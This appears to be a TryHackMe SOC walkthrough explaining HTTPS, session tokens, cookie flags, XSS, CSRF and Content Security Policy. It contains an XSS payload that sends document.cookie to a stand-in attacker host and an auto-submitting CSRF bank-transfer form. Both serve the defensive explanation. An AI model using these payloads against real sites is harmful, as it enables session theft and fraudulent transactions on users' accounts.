# Web Security Essentials

**Platform:** TryHackMe
**Path:** SOC Level 1 — Section 08: Web Security Monitoring
**Difficulty:** Easy
**Type:** Walkthrough
**Status:** Complete

---

## Overview

Covers the security controls protecting web applications — HTTPS and TLS, session management, cookies, XSS, CSRF, and Content Security Policy. The foundation for the web security monitoring rooms that follow.

---

## HTTPS and TLS

HTTPS wraps HTTP in TLS, providing three guarantees:
- **Encryption** — data is unreadable to anyone intercepting the connection
- **Authentication** — the server certificate proves the server's identity
- **Integrity** — modifications to data in transit are detectable

HTTPS protects against eavesdropping on the wire. It does not protect against application vulnerabilities, server compromises, or malicious content served by the legitimate server.

---

## Session Management

HTTP is stateless. After authentication, the server needs to track who each request comes from. This is done through session tokens — unique, random values the server generates after successful login, sent to the browser as a cookie, and returned by the browser with every subsequent request.

**Session token security requirements:**
- Sufficient entropy (at least 128 bits) — not guessable
- Invalidated server-side on logout, not just client-side
- Short expiration for sensitive applications
- Never transmitted over HTTP (only HTTPS)
- Never exposed in URLs (appears in browser history, server logs, Referer headers)

**Secure cookie flags:**
| Flag | Protection |
|------|-----------|
| `HttpOnly` | JavaScript cannot read the cookie — prevents XSS-based session theft |
| `Secure` | Cookie only sent over HTTPS — prevents interception over HTTP |
| `SameSite=Strict` or `Lax` | Prevents the cookie from being sent with cross-site requests — mitigates CSRF |

---

## Cross-Site Scripting (XSS)

An attacker injects JavaScript into a page that other users view. The injected script executes in the victim's browser with full access to the page's DOM and cookies.

**Types:**
| Type | Mechanism | Severity |
|------|-----------|---------|
| Reflected | Payload in URL parameter, executed when victim visits crafted link | Medium |
| Stored | Payload saved to database, executed for every visitor to affected page | High |
| DOM-based | Payload manipulates the DOM without going through the server | Variable |

**Why HttpOnly matters here:** If the session cookie lacks the HttpOnly flag, a single XSS payload can steal it: `<script>document.location='http://attacker.com/?c='+document.cookie</script>`. HttpOnly prevents JavaScript from reading the cookie entirely.

**Mitigation:** Output encoding — never insert user-controlled data directly into HTML. Content Security Policy — whitelist approved script sources.

---

## Cross-Site Request Forgery (CSRF)

An attacker tricks a logged-in user into making an unintended request to a target site. The target site sees the request with valid session cookies and executes it.

**Attack example:** A malicious page contains a hidden form that auto-submits a bank transfer:
```html
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="10000">
  <input name="to" value="attacker_account">
</form>
<script>document.forms[0].submit()</script>
```

When the victim visits this page while logged into their bank, the form submits automatically with their valid session cookie.

**Mitigation:** CSRF tokens — a unique, per-session random value included as a hidden field in every form, validated server-side. The attacker cannot forge this token because they cannot read the victim's session.

---

## Content Security Policy (CSP)

An HTTP response header instructing the browser which sources it is permitted to load resources from:

```
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.trusted.com; style-src 'self'
```

If an attacker manages to inject a script tag pointing to their server, CSP prevents it from loading because the source is not whitelisted. Strong CSP significantly reduces the impact of XSS vulnerabilities.

---

## Key Takeaways

Session token theft bypasses all authentication controls. An attacker with a valid session token looks identical to a legitimate logged-in user. Detection requires behavioural analysis — the same token used from a geographically distant IP, with a completely different User-Agent, in the middle of the night, for a user who normally works only during business hours. Technical controls prevent the theft; behavioural detection catches the abuse.
